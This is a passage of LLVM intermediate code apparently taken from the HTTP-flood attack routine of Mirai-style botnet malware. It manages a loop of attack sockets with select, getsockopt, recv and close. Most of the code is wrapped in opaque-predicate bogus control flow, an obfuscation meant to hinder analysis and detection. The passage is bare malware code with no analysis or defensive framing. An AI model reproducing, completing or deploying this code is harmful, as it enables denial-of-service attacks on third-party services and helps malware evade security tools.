  %1060 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1061 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1060, i32 0, i32 0
  %1062 = load i32, i32* %1061, align 4
  %1063 = load i32, i32* %23, align 4
  %1064 = icmp sgt i32 %1062, %1063
  br i1 %1064, label %1065, label %1070

; <label>:1065:                                   ; preds = %1044
  %1066 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1067 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1066, i32 0, i32 0
  %1068 = load i32, i32* %1067, align 4
  %1069 = add nsw i32 %1068, 1
  store i32 %1069, i32* %23, align 4
  br label %1070

; <label>:1070:                                   ; preds = %1065, %1044
  br label %1244

; <label>:1071:                                   ; preds = %1038
  %1072 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1073 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1072, i32 0, i32 1
  %1074 = load i8, i8* %1073, align 4
  %1075 = zext i8 %1074 to i32
  %1076 = icmp eq i32 %1075, 7
  br i1 %1076, label %1077, label %1120

; <label>:1077:                                   ; preds = %1071
  %1078 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1079 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1078, i32 0, i32 0
  %1080 = load i32, i32* %1079, align 4
  %1081 = srem i32 %1080, 64
  %1082 = zext i32 %1081 to i64
  %1083 = shl i64 1, %1082
  %1084 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1085 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1086 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1085, i32 0, i32 0
  %1087 = load i32, i32* %1086, align 4
  %1088 = sdiv i32 %1087, 64
  %1089 = sext i32 %1088 to i64
  %1090 = getelementptr inbounds [16 x i64], [16 x i64]* %1084, i64 0, i64 %1089
  %1091 = load i64, i64* %1090, align 8
  %1092 = or i64 %1091, %1083
  store i64 %1092, i64* %1090, align 8
  %1093 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1094 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1093, i32 0, i32 0
  %1095 = load i32, i32* %1094, align 4
  %1096 = load i32, i32* %23, align 4
  %1097 = icmp sgt i32 %1095, %1096
  br i1 %1097, label %1098, label %1103

; <label>:1098:                                   ; preds = %1077
  %1099 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1100 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1099, i32 0, i32 0
  %1101 = load i32, i32* %1100, align 4
  %1102 = add nsw i32 %1101, 1
  store i32 %1102, i32* %23, align 4
  br label %1103

; <label>:1103:                                   ; preds = %1098, %1077
  %1104 = load i32, i32* @x.17
  %1105 = load i32, i32* @y.18
  %1106 = sub i32 %1104, 1
  %1107 = mul i32 %1104, %1106
  %1108 = urem i32 %1107, 2
  %1109 = icmp eq i32 %1108, 0
  %1110 = icmp slt i32 %1105, 10
  %1111 = or i1 %1109, %1110
  br i1 %1111, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %1103
  %1112 = load i32, i32* @x.17
  %1113 = load i32, i32* @y.18
  %1114 = sub i32 %1112, 1
  %1115 = mul i32 %1112, %1114
  %1116 = urem i32 %1115, 2
  %1117 = icmp eq i32 %1116, 0
  %1118 = icmp slt i32 %1113, 10
  %1119 = or i1 %1117, %1118
  br i1 %1119, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br label %1227

; <label>:1120:                                   ; preds = %1071
  %1121 = load i32, i32* @x.17
  %1122 = load i32, i32* @y.18
  %1123 = sub i32 %1121, 1
  %1124 = mul i32 %1121, %1123
  %1125 = urem i32 %1124, 2
  %1126 = icmp eq i32 %1125, 0
  %1127 = icmp slt i32 %1122, 10
  %1128 = or i1 %1126, %1127
  br i1 %1128, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %1120
  %1129 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1130 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1129, i32 0, i32 1
  %1131 = load i8, i8* %1130, align 4
  %1132 = zext i8 %1131 to i32
  %1133 = icmp eq i32 %1132, 10
  %1134 = load i32, i32* @x.17
  %1135 = load i32, i32* @y.18
  %1136 = sub i32 %1134, 1
  %1137 = mul i32 %1134, %1136
  %1138 = urem i32 %1137, 2
  %1139 = icmp eq i32 %1138, 0
  %1140 = icmp slt i32 %1135, 10
  %1141 = or i1 %1139, %1140
  br i1 %1141, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br i1 %1133, label %1142, label %1169

; <label>:1142:                                   ; preds = %originalBBpart286
  %1143 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1144 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1143, i32 0, i32 0
  %1145 = load i32, i32* %1144, align 4
  %1146 = srem i32 %1145, 64
  %1147 = zext i32 %1146 to i64
  %1148 = shl i64 1, %1147
  %1149 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1150 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1151 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1150, i32 0, i32 0
  %1152 = load i32, i32* %1151, align 4
  %1153 = sdiv i32 %1152, 64
  %1154 = sext i32 %1153 to i64
  %1155 = getelementptr inbounds [16 x i64], [16 x i64]* %1149, i64 0, i64 %1154
  %1156 = load i64, i64* %1155, align 8
  %1157 = or i64 %1156, %1148
  store i64 %1157, i64* %1155, align 8
  %1158 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1159 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1158, i32 0, i32 0
  %1160 = load i32, i32* %1159, align 4
  %1161 = load i32, i32* %23, align 4
  %1162 = icmp sgt i32 %1160, %1161
  br i1 %1162, label %1163, label %1168

; <label>:1163:                                   ; preds = %1142
  %1164 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1165 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1164, i32 0, i32 0
  %1166 = load i32, i32* %1165, align 4
  %1167 = add nsw i32 %1166, 1
  store i32 %1167, i32* %23, align 4
  br label %1168

; <label>:1168:                                   ; preds = %1163, %1142
  br label %1210

; <label>:1169:                                   ; preds = %originalBBpart286
  %1170 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1171 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1170, i32 0, i32 1
  %1172 = load i8, i8* %1171, align 4
  %1173 = zext i8 %1172 to i32
  %1174 = icmp eq i32 %1173, 11
  br i1 %1174, label %1175, label %1184

; <label>:1175:                                   ; preds = %1169
  %1176 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1177 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1176, i32 0, i32 1
  store i8 0, i8* %1177, align 4
  %1178 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1179 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1178, i32 0, i32 0
  %1180 = load i32, i32* %1179, align 4
  %1181 = call i32 @close(i32 %1180)
  %1182 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1183 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1182, i32 0, i32 0
  store i32 -1, i32* %1183, align 4
  br label %1209

; <label>:1184:                                   ; preds = %1169
  %1185 = load i32, i32* @x.17
  %1186 = load i32, i32* @y.18
  %1187 = sub i32 %1185, 1
  %1188 = mul i32 %1185, %1187
  %1189 = urem i32 %1188, 2
  %1190 = icmp eq i32 %1189, 0
  %1191 = icmp slt i32 %1186, 10
  %1192 = or i1 %1190, %1191
  br i1 %1192, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %1184
  %1193 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1194 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1193, i32 0, i32 1
  store i8 0, i8* %1194, align 4
  %1195 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1196 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1195, i32 0, i32 0
  %1197 = load i32, i32* %1196, align 4
  %1198 = call i32 @close(i32 %1197)
  %1199 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1200 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1199, i32 0, i32 0
  store i32 -1, i32* %1200, align 4
  %1201 = load i32, i32* @x.17
  %1202 = load i32, i32* @y.18
  %1203 = sub i32 %1201, 1
  %1204 = mul i32 %1201, %1203
  %1205 = urem i32 %1204, 2
  %1206 = icmp eq i32 %1205, 0
  %1207 = icmp slt i32 %1202, 10
  %1208 = or i1 %1206, %1207
  br i1 %1208, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br label %1209

; <label>:1209:                                   ; preds = %originalBBpart290, %1175
  br label %1210

; <label>:1210:                                   ; preds = %1209, %1168
  %1211 = load i32, i32* @x.17
  %1212 = load i32, i32* @y.18
  %1213 = sub i32 %1211, 1
  %1214 = mul i32 %1211, %1213
  %1215 = urem i32 %1214, 2
  %1216 = icmp eq i32 %1215, 0
  %1217 = icmp slt i32 %1212, 10
  %1218 = or i1 %1216, %1217
  br i1 %1218, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %1210
  %1219 = load i32, i32* @x.17
  %1220 = load i32, i32* @y.18
  %1221 = sub i32 %1219, 1
  %1222 = mul i32 %1219, %1221
  %1223 = urem i32 %1222, 2
  %1224 = icmp eq i32 %1223, 0
  %1225 = icmp slt i32 %1220, 10
  %1226 = or i1 %1224, %1225
  br i1 %1226, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br label %1227

; <label>:1227:                                   ; preds = %originalBBpart294, %originalBBpart282
  %1228 = load i32, i32* @x.17
  %1229 = load i32, i32* @y.18
  %1230 = sub i32 %1228, 1
  %1231 = mul i32 %1228, %1230
  %1232 = urem i32 %1231, 2
  %1233 = icmp eq i32 %1232, 0
  %1234 = icmp slt i32 %1229, 10
  %1235 = or i1 %1233, %1234
  br i1 %1235, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %1227
  %1236 = load i32, i32* @x.17
  %1237 = load i32, i32* @y.18
  %1238 = sub i32 %1236, 1
  %1239 = mul i32 %1236, %1238
  %1240 = urem i32 %1239, 2
  %1241 = icmp eq i32 %1240, 0
  %1242 = icmp slt i32 %1237, 10
  %1243 = or i1 %1241, %1242
  br i1 %1243, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br label %1244

; <label>:1244:                                   ; preds = %originalBBpart298, %1070
  br label %1245

; <label>:1245:                                   ; preds = %1244, %1037
  %1246 = load i32, i32* @x.17
  %1247 = load i32, i32* @y.18
  %1248 = sub i32 %1246, 1
  %1249 = mul i32 %1246, %1248
  %1250 = urem i32 %1249, 2
  %1251 = icmp eq i32 %1250, 0
  %1252 = icmp slt i32 %1247, 10
  %1253 = or i1 %1251, %1252
  br i1 %1253, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %1245
  %1254 = load i32, i32* @x.17
  %1255 = load i32, i32* @y.18
  %1256 = sub i32 %1254, 1
  %1257 = mul i32 %1254, %1256
  %1258 = urem i32 %1257, 2
  %1259 = icmp eq i32 %1258, 0
  %1260 = icmp slt i32 %1255, 10
  %1261 = or i1 %1259, %1260
  br i1 %1261, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br label %1262

; <label>:1262:                                   ; preds = %originalBBpart2102, %693
  %1263 = load i32, i32* @x.17
  %1264 = load i32, i32* @y.18
  %1265 = sub i32 %1263, 1
  %1266 = mul i32 %1263, %1265
  %1267 = urem i32 %1266, 2
  %1268 = icmp eq i32 %1267, 0
  %1269 = icmp slt i32 %1264, 10
  %1270 = or i1 %1268, %1269
  br i1 %1270, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %1262
  %1271 = load i32, i32* @x.17
  %1272 = load i32, i32* @y.18
  %1273 = sub i32 %1271, 1
  %1274 = mul i32 %1271, %1273
  %1275 = urem i32 %1274, 2
  %1276 = icmp eq i32 %1275, 0
  %1277 = icmp slt i32 %1272, 10
  %1278 = or i1 %1276, %1277
  br i1 %1278, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br label %1279

; <label>:1279:                                   ; preds = %originalBBpart2106, %644
  %1280 = load i32, i32* @x.17
  %1281 = load i32, i32* @y.18
  %1282 = sub i32 %1280, 1
  %1283 = mul i32 %1280, %1282
  %1284 = urem i32 %1283, 2
  %1285 = icmp eq i32 %1284, 0
  %1286 = icmp slt i32 %1281, 10
  %1287 = or i1 %1285, %1286
  br i1 %1287, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %1279
  %1288 = load i32, i32* @x.17
  %1289 = load i32, i32* @y.18
  %1290 = sub i32 %1288, 1
  %1291 = mul i32 %1288, %1290
  %1292 = urem i32 %1291, 2
  %1293 = icmp eq i32 %1292, 0
  %1294 = icmp slt i32 %1289, 10
  %1295 = or i1 %1293, %1294
  br i1 %1295, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br label %1296

; <label>:1296:                                   ; preds = %originalBBpart2110, %658, %581
  %1297 = load i32, i32* %9, align 4
  %1298 = add nsw i32 %1297, 1
  store i32 %1298, i32* %9, align 4
  br label %485

; <label>:1299:                                   ; preds = %485
  %1300 = load i32, i32* @x.17
  %1301 = load i32, i32* @y.18
  %1302 = sub i32 %1300, 1
  %1303 = mul i32 %1300, %1302
  %1304 = urem i32 %1303, 2
  %1305 = icmp eq i32 %1304, 0
  %1306 = icmp slt i32 %1301, 10
  %1307 = or i1 %1305, %1306
  br i1 %1307, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %1299
  %1308 = load i32, i32* %23, align 4
  %1309 = icmp eq i32 %1308, 0
  %1310 = load i32, i32* @x.17
  %1311 = load i32, i32* @y.18
  %1312 = sub i32 %1310, 1
  %1313 = mul i32 %1310, %1312
  %1314 = urem i32 %1313, 2
  %1315 = icmp eq i32 %1314, 0
  %1316 = icmp slt i32 %1311, 10
  %1317 = or i1 %1315, %1316
  br i1 %1317, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br i1 %1309, label %1318, label %1335

; <label>:1318:                                   ; preds = %originalBBpart2114
  %1319 = load i32, i32* @x.17
  %1320 = load i32, i32* @y.18
  %1321 = sub i32 %1319, 1
  %1322 = mul i32 %1319, %1321
  %1323 = urem i32 %1322, 2
  %1324 = icmp eq i32 %1323, 0
  %1325 = icmp slt i32 %1320, 10
  %1326 = or i1 %1324, %1325
  br i1 %1326, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %1318
  %1327 = load i32, i32* @x.17
  %1328 = load i32, i32* @y.18
  %1329 = sub i32 %1327, 1
  %1330 = mul i32 %1327, %1329
  %1331 = urem i32 %1330, 2
  %1332 = icmp eq i32 %1331, 0
  %1333 = icmp slt i32 %1328, 10
  %1334 = or i1 %1332, %1333
  br i1 %1334, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br label %462

; <label>:1335:                                   ; preds = %originalBBpart2114
  %1336 = load i32, i32* @x.17
  %1337 = load i32, i32* @y.18
  %1338 = sub i32 %1336, 1
  %1339 = mul i32 %1336, %1338
  %1340 = urem i32 %1339, 2
  %1341 = icmp eq i32 %1340, 0
  %1342 = icmp slt i32 %1337, 10
  %1343 = or i1 %1341, %1342
  br i1 %1343, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %1335
  %1344 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %1344, align 8
  %1345 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %1345, align 8
  %1346 = load i32, i32* %23, align 4
  %1347 = call i32 @select(i32 %1346, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %1347, i32* %24, align 4
  %1348 = call i64 @time(i64* null) #6
  %1349 = trunc i64 %1348 to i32
  store i32 %1349, i32* %27, align 4
  %1350 = load i32, i32* %24, align 4
  %1351 = icmp slt i32 %1350, 1
  %1352 = load i32, i32* @x.17
  %1353 = load i32, i32* @y.18
  %1354 = sub i32 %1352, 1
  %1355 = mul i32 %1352, %1354
  %1356 = urem i32 %1355, 2
  %1357 = icmp eq i32 %1356, 0
  %1358 = icmp slt i32 %1353, 10
  %1359 = or i1 %1357, %1358
  br i1 %1359, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br i1 %1351, label %1360, label %1377

; <label>:1360:                                   ; preds = %originalBBpart2122
  %1361 = load i32, i32* @x.17
  %1362 = load i32, i32* @y.18
  %1363 = sub i32 %1361, 1
  %1364 = mul i32 %1361, %1363
  %1365 = urem i32 %1364, 2
  %1366 = icmp eq i32 %1365, 0
  %1367 = icmp slt i32 %1362, 10
  %1368 = or i1 %1366, %1367
  br i1 %1368, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %1360
  %1369 = load i32, i32* @x.17
  %1370 = load i32, i32* @y.18
  %1371 = sub i32 %1369, 1
  %1372 = mul i32 %1369, %1371
  %1373 = urem i32 %1372, 2
  %1374 = icmp eq i32 %1373, 0
  %1375 = icmp slt i32 %1370, 10
  %1376 = or i1 %1374, %1375
  br i1 %1376, label %originalBBpart2126, label %originalBB124alteredBB

originalBBpart2126:                               ; preds = %originalBB124
  br label %462

; <label>:1377:                                   ; preds = %originalBBpart2122
  %1378 = load i32, i32* @x.17
  %1379 = load i32, i32* @y.18
  %1380 = sub i32 %1378, 1
  %1381 = mul i32 %1378, %1380
  %1382 = urem i32 %1381, 2
  %1383 = icmp eq i32 %1382, 0
  %1384 = icmp slt i32 %1379, 10
  %1385 = or i1 %1383, %1384
  br i1 %1385, label %originalBB128, label %originalBB128alteredBB

originalBB128:                                    ; preds = %originalBB128alteredBB, %1377
  store i32 0, i32* %9, align 4
  %1386 = load i32, i32* @x.17
  %1387 = load i32, i32* @y.18
  %1388 = sub i32 %1386, 1
  %1389 = mul i32 %1386, %1388
  %1390 = urem i32 %1389, 2
  %1391 = icmp eq i32 %1390, 0
  %1392 = icmp slt i32 %1387, 10
  %1393 = or i1 %1391, %1392
  br i1 %1393, label %originalBBpart2130, label %originalBB128alteredBB

originalBBpart2130:                               ; preds = %originalBB128
  br label %1394

; <label>:1394:                                   ; preds = %4025, %originalBBpart2130
  %1395 = load i32, i32* %9, align 4
  %1396 = load i32, i32* %18, align 4
  %1397 = icmp slt i32 %1395, %1396
  br i1 %1397, label %1398, label %4028

; <label>:1398:                                   ; preds = %1394
  %1399 = load i32, i32* @x.17
  %1400 = load i32, i32* @y.18
  %1401 = sub i32 %1399, 1
  %1402 = mul i32 %1399, %1401
  %1403 = urem i32 %1402, 2
  %1404 = icmp eq i32 %1403, 0
  %1405 = icmp slt i32 %1400, 10
  %1406 = or i1 %1404, %1405
  br i1 %1406, label %originalBB132, label %originalBB132alteredBB

originalBB132:                                    ; preds = %originalBB132alteredBB, %1398
  %1407 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %1408 = load i32, i32* %9, align 4
  %1409 = sext i32 %1408 to i64
  %1410 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1407, i64 %1409
  store %struct.attack_http_state* %1410, %struct.attack_http_state** %26, align 8
  %1411 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1412 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1411, i32 0, i32 0
  %1413 = load i32, i32* %1412, align 4
  %1414 = icmp eq i32 %1413, -1
  %1415 = load i32, i32* @x.17
  %1416 = load i32, i32* @y.18
  %1417 = sub i32 %1415, 1
  %1418 = mul i32 %1415, %1417
  %1419 = urem i32 %1418, 2
  %1420 = icmp eq i32 %1419, 0
  %1421 = icmp slt i32 %1416, 10
  %1422 = or i1 %1420, %1421
  br i1 %1422, label %originalBBpart2134, label %originalBB132alteredBB

originalBBpart2134:                               ; preds = %originalBB132
  br i1 %1414, label %1423, label %1424

; <label>:1423:                                   ; preds = %originalBBpart2134
  br label %4025

; <label>:1424:                                   ; preds = %originalBBpart2134
  %1425 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %1426 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1427 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1426, i32 0, i32 0
  %1428 = load i32, i32* %1427, align 4
  %1429 = sdiv i32 %1428, 64
  %1430 = sext i32 %1429 to i64
  %1431 = getelementptr inbounds [16 x i64], [16 x i64]* %1425, i64 0, i64 %1430
  %1432 = load i64, i64* %1431, align 8
  %1433 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1434 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1433, i32 0, i32 0
  %1435 = load i32, i32* %1434, align 4
  %1436 = srem i32 %1435, 64
  %1437 = zext i32 %1436 to i64
  %1438 = shl i64 1, %1437
  %1439 = and i64 %1432, %1438
  %1440 = icmp ne i64 %1439, 0
  br i1 %1440, label %1441, label %1497

; <label>:1441:                                   ; preds = %1424
  %1442 = load i32, i32* @x.17
  %1443 = load i32, i32* @y.18
  %1444 = sub i32 %1442, 1
  %1445 = mul i32 %1442, %1444
  %1446 = urem i32 %1445, 2
  %1447 = icmp eq i32 %1446, 0
  %1448 = icmp slt i32 %1443, 10
  %1449 = or i1 %1447, %1448
  br i1 %1449, label %originalBB136, label %originalBB136alteredBB

originalBB136:                                    ; preds = %originalBB136alteredBB, %1441
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %1450 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1451 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1450, i32 0, i32 0
  %1452 = load i32, i32* %1451, align 4
  %1453 = bitcast i32* %35 to i8*
  %1454 = call i32 @getsockopt(i32 %1452, i32 1, i32 4, i8* %1453, i32* %36) #6
  store i32 %1454, i32* %12, align 4
  %1455 = load i32, i32* %35, align 4
  %1456 = icmp eq i32 %1455, 0
  %1457 = load i32, i32* @x.17
  %1458 = load i32, i32* @y.18
  %1459 = sub i32 %1457, 1
  %1460 = mul i32 %1457, %1459
  %1461 = urem i32 %1460, 2
  %1462 = icmp eq i32 %1461, 0
  %1463 = icmp slt i32 %1458, 10
  %1464 = or i1 %1462, %1463
  br i1 %1464, label %originalBBpart2138, label %originalBB136alteredBB

originalBBpart2138:                               ; preds = %originalBB136
  br i1 %1456, label %1465, label %1471

; <label>:1465:                                   ; preds = %originalBBpart2138
  %1466 = load i32, i32* %12, align 4
  %1467 = icmp eq i32 %1466, 0
  br i1 %1467, label %1468, label %1471

; <label>:1468:                                   ; preds = %1465
  %1469 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1470 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1469, i32 0, i32 1
  store i8 4, i8* %1470, align 4
  br label %1480

; <label>:1471:                                   ; preds = %1465, %originalBBpart2138
  %1472 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1473 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1472, i32 0, i32 0
  %1474 = load i32, i32* %1473, align 4
  %1475 = call i32 @close(i32 %1474)
  %1476 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1477 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1476, i32 0, i32 0
  store i32 -1, i32* %1477, align 4
  %1478 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1479 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1478, i32 0, i32 1
  store i8 0, i8* %1479, align 4
  br label %4025

; <label>:1480:                                   ; preds = %1468
  %1481 = load i32, i32* @x.17
  %1482 = load i32, i32* @y.18
  %1483 = sub i32 %1481, 1
  %1484 = mul i32 %1481, %1483
  %1485 = urem i32 %1484, 2
  %1486 = icmp eq i32 %1485, 0
  %1487 = icmp slt i32 %1482, 10
  %1488 = or i1 %1486, %1487
  br i1 %1488, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %1480
  %1489 = load i32, i32* @x.17
  %1490 = load i32, i32* @y.18
  %1491 = sub i32 %1489, 1
  %1492 = mul i32 %1489, %1491
  %1493 = urem i32 %1492, 2
  %1494 = icmp eq i32 %1493, 0
  %1495 = icmp slt i32 %1490, 10
  %1496 = or i1 %1494, %1495
  br i1 %1496, label %originalBBpart2142, label %originalBB140alteredBB

originalBBpart2142:                               ; preds = %originalBB140
  br label %1497

; <label>:1497:                                   ; preds = %originalBBpart2142, %1424
  %1498 = load i32, i32* @x.17
  %1499 = load i32, i32* @y.18
  %1500 = sub i32 %1498, 1
  %1501 = mul i32 %1498, %1500
  %1502 = urem i32 %1501, 2
  %1503 = icmp eq i32 %1502, 0
  %1504 = icmp slt i32 %1499, 10
  %1505 = or i1 %1503, %1504
  br i1 %1505, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %1497
  %1506 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1507 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1508 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1507, i32 0, i32 0
  %1509 = load i32, i32* %1508, align 4
  %1510 = sdiv i32 %1509, 64
  %1511 = sext i32 %1510 to i64
  %1512 = getelementptr inbounds [16 x i64], [16 x i64]* %1506, i64 0, i64 %1511
  %1513 = load i64, i64* %1512, align 8
  %1514 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1515 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1514, i32 0, i32 0
  %1516 = load i32, i32* %1515, align 4
  %1517 = srem i32 %1516, 64
  %1518 = zext i32 %1517 to i64
  %1519 = shl i64 1, %1518
  %1520 = and i64 %1513, %1519
  %1521 = icmp ne i64 %1520, 0
  %1522 = load i32, i32* @x.17
  %1523 = load i32, i32* @y.18
  %1524 = sub i32 %1522, 1
  %1525 = mul i32 %1522, %1524
  %1526 = urem i32 %1525, 2
  %1527 = icmp eq i32 %1526, 0
  %1528 = icmp slt i32 %1523, 10
  %1529 = or i1 %1527, %1528
  br i1 %1529, label %originalBBpart2173, label %originalBB144alteredBB

originalBBpart2173:                               ; preds = %originalBB144
  br i1 %1521, label %1530, label %4024

; <label>:1530:                                   ; preds = %originalBBpart2173
  %1531 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1532 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1531, i32 0, i32 1
  %1533 = load i8, i8* %1532, align 4
  %1534 = zext i8 %1533 to i32
  %1535 = icmp eq i32 %1534, 6
  br i1 %1535, label %1536, label %3299

; <label>:1536:                                   ; preds = %1530
  store i32 0, i32* %37, align 4
  %1537 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %1537, i32 10240)
  %1538 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1539 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1538, i32 0, i32 0
  %1540 = load i32, i32* %1539, align 4
  %1541 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1542 = call i64 @recv(i32 %1540, i8* %1541, i64 10240, i32 16386)
  %1543 = trunc i64 %1542 to i32
  store i32 %1543, i32* %12, align 4
  %1544 = icmp slt i32 %1543, 1
  br i1 %1544, label %1545, label %1570

; <label>:1545:                                   ; preds = %1536
  %1546 = load i32, i32* @x.17
  %1547 = load i32, i32* @y.18
  %1548 = sub i32 %1546, 1
  %1549 = mul i32 %1546, %1548
  %1550 = urem i32 %1549, 2
  %1551 = icmp eq i32 %1550, 0
  %1552 = icmp slt i32 %1547, 10
  %1553 = or i1 %1551, %1552
  br i1 %1553, label %originalBB175, label %originalBB175alteredBB

originalBB175:                                    ; preds = %originalBB175alteredBB, %1545
  %1554 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1555 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1554, i32 0, i32 0
  %1556 = load i32, i32* %1555, align 4
  %1557 = call i32 @close(i32 %1556)
  %1558 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1559 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1558, i32 0, i32 0
  store i32 -1, i32* %1559, align 4
  %1560 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1561 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1560, i32 0, i32 1
  store i8 0, i8* %1561, align 4
